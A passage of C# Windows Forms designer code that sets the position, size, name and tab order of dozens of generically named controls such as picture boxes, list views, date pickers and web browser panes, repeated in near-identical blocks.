			this.ListView3.Name = "ListView3";
			this.ListView3.Size = new Size(173, 27);
			this.ListView3.TabIndex = 60;
			this.ListView3.UseCompatibleStateImageBehavior = false;
			this.DateTimePicker5.Location = new Point(275, 115);
			this.DateTimePicker5.Name = "DateTimePicker5";
			this.DateTimePicker5.Size = new Size(200, 20);
			this.DateTimePicker5.TabIndex = 59;
			this.MonthCalendar3.Location = new Point(470, 173);
			this.MonthCalendar3.Name = "MonthCalendar3";
			this.MonthCalendar3.TabIndex = 58;
			this.PictureBox11.Location = new Point(335, 97);
			this.PictureBox11.Name = "PictureBox11";
			this.PictureBox11.Size = new Size(201, 91);
			this.PictureBox11.TabIndex = 57;
			this.PictureBox11.TabStop = false;
			this.NumericUpDown6.Location = new Point(98, 299);
			this.NumericUpDown6.Name = "NumericUpDown6";
			this.NumericUpDown6.Size = new Size(38, 20);
			this.NumericUpDown6.TabIndex = 56;
			this.ProgressBar3.Location = new Point(45, 61);
			this.ProgressBar3.Name = "ProgressBar3";
			this.ProgressBar3.Size = new Size(36, 75);
			this.ProgressBar3.TabIndex = 55;
			this.PictureBox12.Location = new Point(455, 291);
			this.PictureBox12.Name = "PictureBox12";
			this.PictureBox12.Size = new Size(249, 71);
			this.PictureBox12.TabIndex = 54;
			this.PictureBox12.TabStop = false;
			this.MaskedTextBox6.Location = new Point(202, 318);
			this.MaskedTextBox6.Name = "MaskedTextBox6";
			this.MaskedTextBox6.Size = new Size(154, 20);
			this.MaskedTextBox6.TabIndex = 53;
			this.ComboBox6.FormattingEnabled = true;
			this.ComboBox6.Location = new Point(525, 164);
			this.ComboBox6.Name = "ComboBox6";
			this.ComboBox6.Size = new Size(118, 21);
			this.ComboBox6.TabIndex = 52;
			this.CheckedListBox7.FormattingEnabled = true;
			this.CheckedListBox7.Location = new Point(275, 154);
			this.CheckedListBox7.Name = "CheckedListBox7";
			this.CheckedListBox7.Size = new Size(174, 4);
			this.CheckedListBox7.TabIndex = 51;
			this.DateTimePicker6.Location = new Point(177, 143);
			this.DateTimePicker6.Name = "DateTimePicker6";
			this.DateTimePicker6.Size = new Size(91, 20);
			this.DateTimePicker6.TabIndex = 50;
			this.CheckedListBox8.FormattingEnabled = true;
			this.CheckedListBox8.Location = new Point(249, 97);
			this.CheckedListBox8.Name = "CheckedListBox8";
			this.CheckedListBox8.Size = new Size(90, 19);
			this.CheckedListBox8.TabIndex = 49;
			this.CheckedListBox9.FormattingEnabled = true;
			this.CheckedListBox9.Location = new Point(182, 206);
			this.CheckedListBox9.Name = "CheckedListBox9";
			this.CheckedListBox9.Size = new Size(310, 64);
			this.CheckedListBox9.TabIndex = 48;
			this.MaskedTextBox7.Location = new Point(753, 274);
			this.MaskedTextBox7.Name = "MaskedTextBox7";
			this.MaskedTextBox7.Size = new Size(41, 20);
			this.MaskedTextBox7.TabIndex = 95;
			this.NumericUpDown7.Location = new Point(711, 195);
			this.NumericUpDown7.Name = "NumericUpDown7";
			this.NumericUpDown7.Size = new Size(84, 20);
			this.NumericUpDown7.TabIndex = 94;
			this.PictureBox13.Location = new Point(163, 74);
			this.PictureBox13.Name = "PictureBox13";
			this.PictureBox13.Size = new Size(94, 31);
			this.PictureBox13.TabIndex = 93;
			this.PictureBox13.TabStop = false;
			this.WebBrowser4.Location = new Point(576, 69);
			this.WebBrowser4.MinimumSize = new Size(20, 20);
			this.WebBrowser4.Name = "WebBrowser4";
			this.WebBrowser4.Size = new Size(171, 90);
			this.WebBrowser4.TabIndex = 92;
			this.TreeView4.Location = new Point(328, 290);
			this.TreeView4.Name = "TreeView4";
			this.TreeView4.Size = new Size(135, 50);
			this.TreeView4.TabIndex = 91;
			this.TextBox4.Location = new Point(375, 258);
			this.TextBox4.Name = "TextBox4";
			this.TextBox4.Size = new Size(107, 20);
			this.TextBox4.TabIndex = 90;
			this.RadioButton7.AutoSize = true;
			this.RadioButton7.Location = new Point(487, 181);
			this.RadioButton7.Name = "RadioButton7";
			this.RadioButton7.Size = new Size(90, 17);
			this.RadioButton7.TabIndex = 89;
			this.RadioButton7.TabStop = true;
			this.RadioButton7.Text = "RadioButton7";
			this.RadioButton7.UseVisualStyleBackColor = true;
			this.RadioButton8.AutoSize = true;
			this.RadioButton8.Location = new Point(88, 214);
			this.RadioButton8.Name = "RadioButton8";
			this.RadioButton8.Size = new Size(90, 17);
			this.RadioButton8.TabIndex = 88;
			this.RadioButton8.TabStop = true;
			this.RadioButton8.Text = "RadioButton8";
			this.RadioButton8.UseVisualStyleBackColor = true;
			this.PictureBox14.Location = new Point(232, 195);
			this.PictureBox14.Name = "PictureBox14";
			this.PictureBox14.Size = new Size(97, 86);
			this.PictureBox14.TabIndex = 87;
			this.PictureBox14.TabStop = false;
			this.ComboBox7.FormattingEnabled = true;
			this.ComboBox7.Location = new Point(184, 195);
			this.ComboBox7.Name = "ComboBox7";
			this.ComboBox7.Size = new Size(146, 21);
			this.ComboBox7.TabIndex = 86;
			this.Label4.AutoSize = true;
			this.Label4.Location = new Point(80, 223);
			this.Label4.Name = "Label4";
			this.Label4.Size = new Size(39, 13);
			this.Label4.TabIndex = 85;
			this.Label4.Text = "Label4";
			this.ListView4.HideSelection = false;
			this.ListView4.Location = new Point(37, 142);
			this.ListView4.Name = "ListView4";
			this.ListView4.Size = new Size(173, 27);
			this.ListView4.TabIndex = 84;
			this.ListView4.UseCompatibleStateImageBehavior = false;
			this.DateTimePicker7.Location = new Point(283, 123);
			this.DateTimePicker7.Name = "DateTimePicker7";
			this.DateTimePicker7.Size = new Size(200, 20);
			this.DateTimePicker7.TabIndex = 83;
			this.MonthCalendar4.Location = new Point(478, 181);
			this.MonthCalendar4.Name = "MonthCalendar4";
			this.MonthCalendar4.TabIndex = 82;
			this.PictureBox15.Location = new Point(343, 105);
			this.PictureBox15.Name = "PictureBox15";
			this.PictureBox15.Size = new Size(201, 91);
			this.PictureBox15.TabIndex = 81;
			this.PictureBox15.TabStop = false;
			this.NumericUpDown8.Location = new Point(106, 307);
			this.NumericUpDown8.Name = "NumericUpDown8";
			this.NumericUpDown8.Size = new Size(38, 20);
			this.NumericUpDown8.TabIndex = 80;
			this.ProgressBar4.Location = new Point(53, 69);
			this.ProgressBar4.Name = "ProgressBar4";
			this.ProgressBar4.Size = new Size(36, 75);
			this.ProgressBar4.TabIndex = 79;
			this.PictureBox16.Location = new Point(463, 299);
			this.PictureBox16.Name = "PictureBox16";
			this.PictureBox16.Size = new Size(249, 71);
			this.PictureBox16.TabIndex = 78;
			this.PictureBox16.TabStop = false;
			this.MaskedTextBox8.Location = new Point(210, 326);
			this.MaskedTextBox8.Name = "MaskedTextBox8";
			this.MaskedTextBox8.Size = new Size(154, 20);
			this.MaskedTextBox8.TabIndex = 77;
			this.ComboBox8.FormattingEnabled = true;
			this.ComboBox8.Location = new Point(533, 172);
			this.ComboBox8.Name = "ComboBox8";
			this.ComboBox8.Size = new Size(118, 21);
			this.ComboBox8.TabIndex = 76;
			this.CheckedListBox10.FormattingEnabled = true;
			this.CheckedListBox10.Location = new Point(283, 162);
			this.CheckedListBox10.Name = "CheckedListBox10";
			this.CheckedListBox10.Size = new Size(174, 4);
			this.CheckedListBox10.TabIndex = 75;
			this.DateTimePicker8.Location = new Point(185, 151);
			this.DateTimePicker8.Name = "DateTimePicker8";
			this.DateTimePicker8.Size = new Size(91, 20);
			this.DateTimePicker8.TabIndex = 74;
			this.CheckedListBox11.FormattingEnabled = true;
			this.CheckedListBox11.Location = new Point(257, 105);
			this.CheckedListBox11.Name = "CheckedListBox11";
			this.CheckedListBox11.Size = new Size(90, 19);
			this.CheckedListBox11.TabIndex = 73;
			this.CheckedListBox12.FormattingEnabled = true;
			this.CheckedListBox12.Location = new Point(190, 214);
			this.CheckedListBox12.Name = "CheckedListBox12";
			this.CheckedListBox12.Size = new Size(310, 64);
			this.CheckedListBox12.TabIndex = 72;
			this.MaskedTextBox9.Location = new Point(716, 205);
			this.MaskedTextBox9.Name = "MaskedTextBox9";
			this.MaskedTextBox9.Size = new Size(41, 20);
			this.MaskedTextBox9.TabIndex = 119;
			this.NumericUpDown9.Location = new Point(674, 126);
			this.NumericUpDown9.Name = "NumericUpDown9";
			this.NumericUpDown9.Size = new Size(84, 20);
			this.NumericUpDown9.TabIndex = 118;
			this.PictureBox17.Location = new Point(126, 5);
			this.PictureBox17.Name = "PictureBox17";
			this.PictureBox17.Size = new Size(94, 31);
			this.PictureBox17.TabIndex = 117;
			this.PictureBox17.TabStop = false;
			this.WebBrowser5.Location = new Point(539, 0);
			this.WebBrowser5.MinimumSize = new Size(20, 20);
			this.WebBrowser5.Name = "WebBrowser5";
			this.WebBrowser5.Size = new Size(171, 90);
			this.WebBrowser5.TabIndex = 116;
			this.TreeView5.Location = new Point(291, 221);
			this.TreeView5.Name = "TreeView5";
			this.TreeView5.Size = new Size(135, 50);
			this.TreeView5.TabIndex = 115;
			this.TextBox5.Location = new Point(338, 189);
			this.TextBox5.Name = "TextBox5";
			this.TextBox5.Size = new Size(107, 20);
			this.TextBox5.TabIndex = 114;
			this.RadioButton9.AutoSize = true;
			this.RadioButton9.Location = new Point(450, 112);
			this.RadioButton9.Name = "RadioButton9";
			this.RadioButton9.Size = new Size(90, 17);
			this.RadioButton9.TabIndex = 113;
			this.RadioButton9.TabStop = true;
			this.RadioButton9.Text = "RadioButton9";
			this.RadioButton9.UseVisualStyleBackColor = true;
			this.RadioButton10.AutoSize = true;
			this.RadioButton10.Location = new Point(51, 145);
			this.RadioButton10.Name = "RadioButton10";
			this.RadioButton10.Size = new Size(96, 17);
			this.RadioButton10.TabIndex = 112;
			this.RadioButton10.TabStop = true;
			this.RadioButton10.Text = "RadioButton10";
			this.RadioButton10.UseVisualStyleBackColor = true;
			this.PictureBox18.Location = new Point(195, 126);
			this.PictureBox18.Name = "PictureBox18";
			this.PictureBox18.Size = new Size(97, 86);
			this.PictureBox18.TabIndex = 111;
			this.PictureBox18.TabStop = false;
			this.ComboBox9.FormattingEnabled = true;
			this.ComboBox9.Location = new Point(147, 126);
			this.ComboBox9.Name = "ComboBox9";
			this.ComboBox9.Size = new Size(146, 21);
			this.ComboBox9.TabIndex = 110;
			this.Label5.AutoSize = true;
			this.Label5.Location = new Point(43, 154);
			this.Label5.Name = "Label5";
			this.Label5.Size = new Size(39, 13);
			this.Label5.TabIndex = 109;
			this.Label5.Text = "Label5";
			this.ListView5.HideSelection = false;
			this.ListView5.Location = new Point(0, 73);
			this.ListView5.Name = "ListView5";
			this.ListView5.Size = new Size(173, 27);
			this.ListView5.TabIndex = 108;
			this.ListView5.UseCompatibleStateImageBehavior = false;
			this.DateTimePicker9.Location = new Point(246, 54);
			this.DateTimePicker9.Name = "DateTimePicker9";
			this.DateTimePicker9.Size = new Size(200, 20);
			this.DateTimePicker9.TabIndex = 107;
			this.MonthCalendar5.Location = new Point(441, 112);
			this.MonthCalendar5.Name = "MonthCalendar5";
			this.MonthCalendar5.TabIndex = 106;
			this.PictureBox19.Location = new Point(306, 36);
			this.PictureBox19.Name = "PictureBox19";
			this.PictureBox19.Size = new Size(201, 91);
			this.PictureBox19.TabIndex = 105;
			this.PictureBox19.TabStop = false;
			this.NumericUpDown10.Location = new Point(69, 238);
			this.NumericUpDown10.Name = "NumericUpDown10";
			this.NumericUpDown10.Size = new Size(38, 20);
			this.NumericUpDown10.TabIndex = 104;
			this.ProgressBar5.Location = new Point(16, 0);
			this.ProgressBar5.Name = "ProgressBar5";
			this.ProgressBar5.Size = new Size(36, 75);
			this.ProgressBar5.TabIndex = 103;
			this.PictureBox20.Location = new Point(426, 230);
			this.PictureBox20.Name = "PictureBox20";
			this.PictureBox20.Size = new Size(249, 71);
			this.PictureBox20.TabIndex = 102;
			this.PictureBox20.TabStop = false;
			this.MaskedTextBox10.Location = new Point(173, 257);
			this.MaskedTextBox10.Name = "MaskedTextBox10";
			this.MaskedTextBox10.Size = new Size(154, 20);
			this.MaskedTextBox10.TabIndex = 101;
			this.ComboBox10.FormattingEnabled = true;
			this.ComboBox10.Location = new Point(496, 103);
			this.ComboBox10.Name = "ComboBox10";
			this.ComboBox10.Size = new Size(118, 21);
			this.ComboBox10.TabIndex = 100;
			this.CheckedListBox13.FormattingEnabled = true;
			this.CheckedListBox13.Location = new Point(246, 93);
			this.CheckedListBox13.Name = "CheckedListBox13";
			this.CheckedListBox13.Size = new Size(174, 4);
			this.CheckedListBox13.TabIndex = 99;
			this.DateTimePicker10.Location = new Point(148, 82);
			this.DateTimePicker10.Name = "DateTimePicker10";
			this.DateTimePicker10.Size = new Size(91, 20);
			this.DateTimePicker10.TabIndex = 98;
			this.CheckedListBox14.FormattingEnabled = true;
			this.CheckedListBox14.Location = new Point(220, 36);
			this.CheckedListBox14.Name = "CheckedListBox14";
			this.CheckedListBox14.Size = new Size(90, 19);
			this.CheckedListBox14.TabIndex = 97;
			this.CheckedListBox15.FormattingEnabled = true;
			this.CheckedListBox15.Location = new Point(153, 145);
			this.CheckedListBox15.Name = "CheckedListBox15";
			this.CheckedListBox15.Size = new Size(310, 64);
			this.CheckedListBox15.TabIndex = 96;
			this.MaskedTextBox11.Location = new Point(724, 213);
			this.MaskedTextBox11.Name = "MaskedTextBox11";
			this.MaskedTextBox11.Size = new Size(41, 20);
			this.MaskedTextBox11.TabIndex = 143;
			this.NumericUpDown11.Location = new Point(682, 134);
			this.NumericUpDown11.Name = "NumericUpDown11";
			this.NumericUpDown11.Size = new Size(84, 20);
			this.NumericUpDown11.TabIndex = 142;
			this.PictureBox21.Location = new Point(134, 13);
			this.PictureBox21.Name = "PictureBox21";
			this.PictureBox21.Size = new Size(94, 31);
			this.PictureBox21.TabIndex = 141;
			this.PictureBox21.TabStop = false;
			this.WebBrowser6.Location = new Point(547, 8);
			this.WebBrowser6.MinimumSize = new Size(20, 20);
			this.WebBrowser6.Name = "WebBrowser6";
			this.WebBrowser6.Size = new Size(171, 90);
			this.WebBrowser6.TabIndex = 140;
			this.TreeView6.Location = new Point(299, 229);
			this.TreeView6.Name = "TreeView6";
			this.TreeView6.Size = new Size(135, 50);
			this.TreeView6.TabIndex = 139;
			this.TextBox6.Location = new Point(346, 197);
			this.TextBox6.Name = "TextBox6";
			this.TextBox6.Size = new Size(107, 20);
			this.TextBox6.TabIndex = 138;
			this.RadioButton11.AutoSize = true;
			this.RadioButton11.Location = new Point(458, 120);
			this.RadioButton11.Name = "RadioButton11";
			this.RadioButton11.Size = new Size(96, 17);
			this.RadioButton11.TabIndex = 137;
			this.RadioButton11.TabStop = true;
			this.RadioButton11.Text = "RadioButton11";
			this.RadioButton11.UseVisualStyleBackColor = true;
			this.RadioButton12.AutoSize = true;
			this.RadioButton12.Location = new Point(59, 153);
			this.RadioButton12.Name = "RadioButton12";
			this.RadioButton12.Size = new Size(96, 17);
			this.RadioButton12.TabIndex = 136;
			this.RadioButton12.TabStop = true;
			this.RadioButton12.Text = "RadioButton12";
			this.RadioButton12.UseVisualStyleBackColor = true;
			this.PictureBox22.Location = new Point(203, 134);
			this.PictureBox22.Name = "PictureBox22";
			this.PictureBox22.Size = new Size(97, 86);
			this.PictureBox22.TabIndex = 135;
			this.PictureBox22.TabStop = false;
			this.ComboBox11.FormattingEnabled = true;
			this.ComboBox11.Location = new Point(155, 134);
			this.ComboBox11.Name = "ComboBox11";
			this.ComboBox11.Size = new Size(146, 21);
			this.ComboBox11.TabIndex = 134;
			this.Label6.AutoSize = true;
			this.Label6.Location = new Point(51, 162);
			this.Label6.Name = "Label6";
			this.Label6.Size = new Size(39, 13);
			this.Label6.TabIndex = 133;
			this.Label6.Text = "Label6";
			this.ListView6.HideSelection = false;
			this.ListView6.Location = new Point(8, 81);
			this.ListView6.Name = "ListView6";
			this.ListView6.Size = new Size(173, 27);
			this.ListView6.TabIndex = 132;
			this.ListView6.UseCompatibleStateImageBehavior = false;
			this.DateTimePicker11.Location = new Point(254, 62);
			this.DateTimePicker11.Name = "DateTimePicker11";
			this.DateTimePicker11.Size = new Size(200, 20);
			this.DateTimePicker11.TabIndex = 131;
			this.MonthCalendar6.Location = new Point(449, 120);
			this.MonthCalendar6.Name = "MonthCalendar6";
			this.MonthCalendar6.TabIndex = 130;
			this.PictureBox23.Location = new Point(314, 44);
			this.PictureBox23.Name = "PictureBox23";
			this.PictureBox23.Size = new Size(201, 91);
			this.PictureBox23.TabIndex = 129;
			this.PictureBox23.TabStop = false;
			this.NumericUpDown12.Location = new Point(77, 246);
			this.NumericUpDown12.Name = "NumericUpDown12";
			this.NumericUpDown12.Size = new Size(38, 20);
			this.NumericUpDown12.TabIndex = 128;
			this.ProgressBar6.Location = new Point(24, 8);
			this.ProgressBar6.Name = "ProgressBar6";
			this.ProgressBar6.Size = new Size(36, 75);
			this.ProgressBar6.TabIndex = 127;
			this.PictureBox24.Location = new Point(434, 238);
			this.PictureBox24.Name = "PictureBox24";
			this.PictureBox24.Size = new Size(249, 71);
			this.PictureBox24.TabIndex = 126;
			this.PictureBox24.TabStop = false;
			this.MaskedTextBox12.Location = new Point(181, 265);
			this.MaskedTextBox12.Name = "MaskedTextBox12";
			this.MaskedTextBox12.Size = new Size(154, 20);
			this.MaskedTextBox12.TabIndex = 125;
			this.ComboBox12.FormattingEnabled = true;
			this.ComboBox12.Location = new Point(504, 111);
			this.ComboBox12.Name = "ComboBox12";
			this.ComboBox12.Size = new Size(118, 21);
			this.ComboBox12.TabIndex = 124;
			this.CheckedListBox16.FormattingEnabled = true;
			this.CheckedListBox16.Location = new Point(254, 101);
			this.CheckedListBox16.Name = "CheckedListBox16";
			this.CheckedListBox16.Size = new Size(174, 4);
			this.CheckedListBox16.TabIndex = 123;
			this.DateTimePicker12.Location = new Point(156, 90);
			this.DateTimePicker12.Name = "DateTimePicker12";
			this.DateTimePicker12.Size = new Size(91, 20);
			this.DateTimePicker12.TabIndex = 122;
			this.CheckedListBox17.FormattingEnabled = true;
			this.CheckedListBox17.Location = new Point(228, 44);
			this.CheckedListBox17.Name = "CheckedListBox17";
			this.CheckedListBox17.Size = new Size(90, 19);
			this.CheckedListBox17.TabIndex = 121;
			this.CheckedListBox18.FormattingEnabled = true;
			this.CheckedListBox18.Location = new Point(161, 153);
			this.CheckedListBox18.Name = "CheckedListBox18";
			this.CheckedListBox18.Size = new Size(310, 64);
			this.CheckedListBox18.TabIndex = 120;
			this.MaskedTextBox13.Location = new Point(673, 272);
			this.MaskedTextBox13.Name = "MaskedTextBox13";
			this.MaskedTextBox13.Size = new Size(41, 20);
			this.MaskedTextBox13.TabIndex = 286;
			this.NumericUpDown13.Location = new Point(631, 193);
			this.NumericUpDown13.Name = "NumericUpDown13";
			this.NumericUpDown13.Size = new Size(84, 20);
			this.NumericUpDown13.TabIndex = 285;
			this.PictureBox25.Location = new Point(83, 72);
			this.PictureBox25.Name = "PictureBox25";
			this.PictureBox25.Size = new Size(94, 31);
			this.PictureBox25.TabIndex = 284;
			this.PictureBox25.TabStop = false;
			this.WebBrowser7.Location = new Point(496, 67);
			this.WebBrowser7.MinimumSize = new Size(20, 20);
			this.WebBrowser7.Name = "WebBrowser7";
			this.WebBrowser7.Size = new Size(171, 90);
			this.WebBrowser7.TabIndex = 283;
			this.TreeView7.Location = new Point(248, 288);
			this.TreeView7.Name = "TreeView7";
			this.TreeView7.Size = new Size(135, 50);
			this.TreeView7.TabIndex = 282;
			this.TextBox7.Location = new Point(295, 256);
			this.TextBox7.Name = "TextBox7";
			this.TextBox7.Size = new Size(107, 20);
			this.TextBox7.TabIndex = 281;
			this.RadioButton13.AutoSize = true;
			this.RadioButton13.Location = new Point(407, 179);
			this.RadioButton13.Name = "RadioButton13";
			this.RadioButton13.Size = new Size(96, 17);
			this.RadioButton13.TabIndex = 280;
			this.RadioButton13.TabStop = true;
			this.RadioButton13.Text = "RadioButton13";
			this.RadioButton13.UseVisualStyleBackColor = true;
			this.RadioButton14.AutoSize = true;
			this.RadioButton14.Location = new Point(8, 212);
			this.RadioButton14.Name = "RadioButton14";
			this.RadioButton14.Size = new Size(96, 17);
			this.RadioButton14.TabIndex = 279;
			this.RadioButton14.TabStop = true;
			this.RadioButton14.Text = "RadioButton14";
			this.RadioButton14.UseVisualStyleBackColor = true;
			this.PictureBox26.Location = new Point(152, 193);
			this.PictureBox26.Name = "PictureBox26";
			this.PictureBox26.Size = new Size(97, 86);
			this.PictureBox26.TabIndex = 278;
			this.PictureBox26.TabStop = false;
			this.ComboBox13.FormattingEnabled = true;
			this.ComboBox13.Location = new Point(104, 193);
			this.ComboBox13.Name = "ComboBox13";
			this.ComboBox13.Size = new Size(146, 21);
			this.ComboBox13.TabIndex = 277;
			this.Label7.AutoSize = true;
			this.Label7.Location = new Point(0, 221);
			this.Label7.Name = "Label7";
			this.Label7.Size = new Size(39, 13);
			this.Label7.TabIndex = 276;
			this.Label7.Text = "Label7";
			this.ListView7.HideSelection = false;
			this.ListView7.Location = new Point(-43, 140);
			this.ListView7.Name = "ListView7";
			this.ListView7.Size = new Size(173, 27);
			this.ListView7.TabIndex = 275;
			this.ListView7.UseCompatibleStateImageBehavior = false;
			this.DateTimePicker13.Location = new Point(203, 121);
			this.DateTimePicker13.Name = "DateTimePicker13";
			this.DateTimePicker13.Size = new Size(200, 20);
			this.DateTimePicker13.TabIndex = 274;
			this.MonthCalendar7.Location = new Point(398, 179);
			this.MonthCalendar7.Name = "MonthCalendar7";
			this.MonthCalendar7.TabIndex = 273;
			this.PictureBox27.Location = new Point(263, 103);
			this.PictureBox27.Name = "PictureBox27";
			this.PictureBox27.Size = new Size(201, 91);
			this.PictureBox27.TabIndex = 272;
			this.PictureBox27.TabStop = false;
			this.NumericUpDown14.Location = new Point(26, 305);
			this.NumericUpDown14.Name = "NumericUpDown14";
			this.NumericUpDown14.Size = new Size(38, 20);
			this.NumericUpDown14.TabIndex = 271;
			this.ProgressBar7.Location = new Point(-27, 67);
			this.ProgressBar7.Name = "ProgressBar7";
			this.ProgressBar7.Size = new Size(36, 75);
			this.ProgressBar7.TabIndex = 270;
			this.PictureBox28.Location = new Point(383, 297);
			this.PictureBox28.Name = "PictureBox28";
			this.PictureBox28.Size = new Size(249, 71);
			this.PictureBox28.TabIndex = 269;
			this.PictureBox28.TabStop = false;
			this.MaskedTextBox14.Location = new Point(130, 324);
			this.MaskedTextBox14.Name = "MaskedTextBox14";
			this.MaskedTextBox14.Size = new Size(154, 20);
			this.MaskedTextBox14.TabIndex = 268;
			this.ComboBox14.FormattingEnabled = true;
			this.ComboBox14.Location = new Point(453, 170);
			this.ComboBox14.Name = "ComboBox14";
			this.ComboBox14.Size = new Size(118, 21);
			this.ComboBox14.TabIndex = 267;
			this.CheckedListBox19.FormattingEnabled = true;
			this.CheckedListBox19.Location = new Point(203, 160);
			this.CheckedListBox19.Name = "CheckedListBox19";
			this.CheckedListBox19.Size = new Size(174, 4);
			this.CheckedListBox19.TabIndex = 266;
			this.DateTimePicker14.Location = new Point(105, 149);
			this.DateTimePicker14.Name = "DateTimePicker14";
			this.DateTimePicker14.Size = new Size(91, 20);
			this.DateTimePicker14.TabIndex = 265;
			this.CheckedListBox20.FormattingEnabled = true;
			this.CheckedListBox20.Location = new Point(177, 103);
			this.CheckedListBox20.Name = "CheckedListBox20";
			this.CheckedListBox20.Size = new Size(90, 19);
			this.CheckedListBox20.TabIndex = 264;
			this.CheckedListBox21.FormattingEnabled = true;
			this.CheckedListBox21.Location = new Point(110, 212);
			this.CheckedListBox21.Name = "CheckedListBox21";
			this.CheckedListBox21.Size = new Size(310, 64);
			this.CheckedListBox21.TabIndex = 263;
			this.MaskedTextBox15.Location = new Point(665, 264);
			this.MaskedTextBox15.Name = "MaskedTextBox15";
			this.MaskedTextBox15.Size = new Size(41, 20);
			this.MaskedTextBox15.TabIndex = 262;
			this.NumericUpDown15.Location = new Point(623, 185);
			this.NumericUpDown15.Name = "NumericUpDown15";
			this.NumericUpDown15.Size = new Size(84, 20);
			this.NumericUpDown15.TabIndex = 261;
			this.PictureBox29.Location = new Point(75, 64);
			this.PictureBox29.Name = "PictureBox29";
			this.PictureBox29.Size = new Size(94, 31);
			this.PictureBox29.TabIndex = 260;
			this.PictureBox29.TabStop = false;
			this.WebBrowser8.Location = new Point(488, 59);
			this.WebBrowser8.MinimumSize = new Size(20, 20);
			this.WebBrowser8.Name = "WebBrowser8";
			this.WebBrowser8.Size = new Size(171, 90);
			this.WebBrowser8.TabIndex = 259;
			this.TreeView8.Location = new Point(240, 280);
			this.TreeView8.Name = "TreeView8";
			this.TreeView8.Size = new Size(135, 50);
			this.TreeView8.TabIndex = 258;
			this.TextBox8.Location = new Point(287, 248);
			this.TextBox8.Name = "TextBox8";
			this.TextBox8.Size = new Size(107, 20);
			this.TextBox8.TabIndex = 257;
			this.RadioButton15.AutoSize = true;
			this.RadioButton15.Location = new Point(399, 171);
			this.RadioButton15.Name = "RadioButton15";
			this.RadioButton15.Size = new Size(96, 17);
			this.RadioButton15.TabIndex = 256;
			this.RadioButton15.TabStop = true;
			this.RadioButton15.Text = "RadioButton15";
			this.RadioButton15.UseVisualStyleBackColor = true;
			this.RadioButton16.AutoSize = true;
			this.RadioButton16.Location = new Point(0, 204);
			this.RadioButton16.Name = "RadioButton16";
			this.RadioButton16.Size = new Size(96, 17);
			this.RadioButton16.TabIndex = 255;
			this.RadioButton16.TabStop = true;
			this.RadioButton16.Text = "RadioButton16";
			this.RadioButton16.UseVisualStyleBackColor = true;
			this.PictureBox30.Location = new Point(144, 185);
			this.PictureBox30.Name = "PictureBox30";
			this.PictureBox30.Size = new Size(97, 86);
			this.PictureBox30.TabIndex = 254;
			this.PictureBox30.TabStop = false;
			this.ComboBox15.FormattingEnabled = true;
			this.ComboBox15.Location = new Point(96, 185);
			this.ComboBox15.Name = "ComboBox15";
			this.ComboBox15.Size = new Size(146, 21);
			this.ComboBox15.TabIndex = 253;
			this.Label8.AutoSize = true;
			this.Label8.Location = new Point(-8, 213);
			this.Label8.Name = "Label8";
			this.Label8.Size = new Size(39, 13);
			this.Label8.TabIndex = 252;
			this.Label8.Text = "Label8";
			this.ListView8.HideSelection = false;
			this.ListView8.Location = new Point(-51, 132);
			this.ListView8.Name = "ListView8";
			this.ListView8.Size = new Size(173, 27);
			this.ListView8.TabIndex = 251;
			this.ListView8.UseCompatibleStateImageBehavior = false;
			this.DateTimePicker15.Location = new Point(195, 113);
			this.DateTimePicker15.Name = "DateTimePicker15";
			this.DateTimePicker15.Size = new Size(200, 20);
			this.DateTimePicker15.TabIndex = 250;
			this.MonthCalendar8.Location = new Point(390, 171);
			this.MonthCalendar8.Name = "MonthCalendar8";
			this.MonthCalendar8.TabIndex = 249;
			this.PictureBox31.Location = new Point(255, 95);
			this.PictureBox31.Name = "PictureBox31";
			this.PictureBox31.Size = new Size(201, 91);
			this.PictureBox31.TabIndex = 248;
			this.PictureBox31.TabStop = false;
			this.NumericUpDown16.Location = new Point(18, 297);
			this.NumericUpDown16.Name = "NumericUpDown16";
			this.NumericUpDown16.Size = new Size(38, 20);
			this.NumericUpDown16.TabIndex = 247;
			this.ProgressBar8.Location = new Point(-35, 59);
			this.ProgressBar8.Name = "ProgressBar8";
			this.ProgressBar8.Size = new Size(36, 75);
			this.ProgressBar8.TabIndex = 246;
			this.PictureBox32.Location = new Point(375, 289);
			this.PictureBox32.Name = "PictureBox32";
			this.PictureBox32.Size = new Size(249, 71);
			this.PictureBox32.TabIndex = 245;
			this.PictureBox32.TabStop = false;
			this.MaskedTextBox16.Location = new Point(122, 316);
			this.MaskedTextBox16.Name = "MaskedTextBox16";
			this.MaskedTextBox16.Size = new Size(154, 20);
			this.MaskedTextBox16.TabIndex = 244;
			this.ComboBox16.FormattingEnabled = true;
			this.ComboBox16.Location = new Point(445, 162);
			this.ComboBox16.Name = "ComboBox16";
			this.ComboBox16.Size = new Size(118, 21);
			this.ComboBox16.TabIndex = 243;
			this.CheckedListBox22.FormattingEnabled = true;
			this.CheckedListBox22.Location = new Point(195, 152);
			this.CheckedListBox22.Name = "CheckedListBox22";
			this.CheckedListBox22.Size = new Size(174, 4);
			this.CheckedListBox22.TabIndex = 242;
			this.DateTimePicker16.Location = new Point(97, 141);
			this.DateTimePicker16.Name = "DateTimePicker16";
			this.DateTimePicker16.Size = new Size(91, 20);
			this.DateTimePicker16.TabIndex = 241;
			this.CheckedListBox23.FormattingEnabled = true;
			this.CheckedListBox23.Location = new Point(169, 95);
			this.CheckedListBox23.Name = "CheckedListBox23";
			this.CheckedListBox23.Size = new Size(90, 19);
			this.CheckedListBox23.TabIndex = 240;
			this.CheckedListBox24.FormattingEnabled = true;
			this.CheckedListBox24.Location = new Point(102, 204);
			this.CheckedListBox24.Name = "CheckedListBox24";
			this.CheckedListBox24.Size = new Size(310, 64);
			this.CheckedListBox24.TabIndex = 239;
			this.NumericUpDown17.Location = new Point(660, 254);
			this.NumericUpDown17.Name = "NumericUpDown17";
			this.NumericUpDown17.Size = new Size(84, 20);
			this.NumericUpDown17.TabIndex = 238;
			this.PictureBox33.Location = new Point(112, 133);
			this.PictureBox33.Name = "PictureBox33";
			this.PictureBox33.Size = new Size(94, 31);
			this.PictureBox33.TabIndex = 237;
			this.PictureBox33.TabStop = false;
			this.WebBrowser9.Location = new Point(525, 128);
			this.WebBrowser9.MinimumSize = new Size(20, 20);
			this.WebBrowser9.Name = "WebBrowser9";
			this.WebBrowser9.Size = new Size(171, 90);
			this.WebBrowser9.TabIndex = 236;
			this.TreeView9.Location = new Point(277, 349);
			this.TreeView9.Name = "TreeView9";
			this.TreeView9.Size = new Size(135, 50);
			this.TreeView9.TabIndex = 235;
			this.TextBox9.Location = new Point(324, 317);
			this.TextBox9.Name = "TextBox9";
			this.TextBox9.Size = new Size(107, 20);
